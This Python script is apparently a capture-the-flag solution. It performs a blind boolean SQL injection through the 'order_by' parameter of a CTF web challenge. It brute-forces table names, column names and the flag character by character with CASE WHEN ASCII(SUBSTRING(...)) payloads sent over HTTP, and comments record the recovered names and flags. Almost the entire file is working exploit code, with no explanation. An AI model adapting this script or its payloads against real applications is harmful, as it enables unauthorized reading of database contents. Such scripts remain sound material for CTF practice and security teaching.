from bs4 import BeautifulSoup
import requests as req
import string

domain = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",}{_.:!@$^&*()#"
url = "http://stembactf.space:5003/index.php?order_by="

def get_table():
	temp = ""
	index = 1
	loop = 0

	while True:
		if loop == 1:
			print("\nTable name =>" + temp +"\n")
			return temp

		if loop == 0:
			for char in domain:
				payload= "(CASE WHEN (SELECT ASCII (SUBSTRING(GROUP_CONCAT(table_name),{}, 1)) FROM information_schema.tables WHERE table_schema=database())={} THEN name ELSE id END)".format(index, ord(char))
				temp_url = url + payload

				r = req.get(temp_url)

				soup = BeautifulSoup(r.content, 'html.parser')
				first_td = soup.find('td')

				if first_td and first_td.text.strip() == '4':
					temp += char
					index += 1
					print(temp)
					break

				elif char == "#":
					loop = 1

def get_column():
	temp = ""
	index = 1
	loop = 0

	while True:
		if loop == 1:
			print("\nColumn name =>" + temp +"\n")
			return temp

		if loop == 0:
			for char in domain:
				payload= "(CASE WHEN (SELECT ASCII (SUBSTRING(GROUP_CONCAT(column_name),{}, 1)) FROM information_schema.columns WHERE table_name='v3ry_s3cr3t_t4bl3')={} THEN name ELSE id END)".format(index, ord(char))
				temp_url = url + payload

				r = req.get(temp_url)

				soup = BeautifulSoup(r.content, 'html.parser')
				first_td = soup.find('td')

				if first_td and first_td.text.strip() == '4':
					temp += char
					index += 1
					print(temp)
					break

				elif char == "#":
					loop = 1

def get_flag():
	temp = ""
	index = 1
	loop = 0

	while True:
		if loop == 1:
			print("\nFlag =>" + temp +"\n")
			return temp

		if loop == 0:
			for char in domain:
				payload= "(CASE WHEN (SELECT ASCII (SUBSTRING(GROUP_CONCAT(th1s_1s_s3cr3t_c0lumn),{}, 1)) FROM v3ry_s3cr3t_t4bl3)={} THEN name ELSE id END)".format(index, ord(char))
				temp_url = url + payload

				r = req.get(temp_url)

				soup = BeautifulSoup(r.content, 'html.parser')
				first_td = soup.find('td')

				if first_td and first_td.text.strip() == '4':
					temp += char
					index += 1
					print(temp)
					break

				elif char == "#":
					loop = 1

# get_table() # hengker_list, v3ry_s3cr3t_t4bl3
# get_column() # id, th1s_1s_s3cr3t_c0lumn
get_flag() # STEMBACTF{th1s_1s_f4k3_Fl49}, STEMBACTF{bL1nD_Sql_1nj3cTi0n_fr0m_0rd3rBy_vuLn}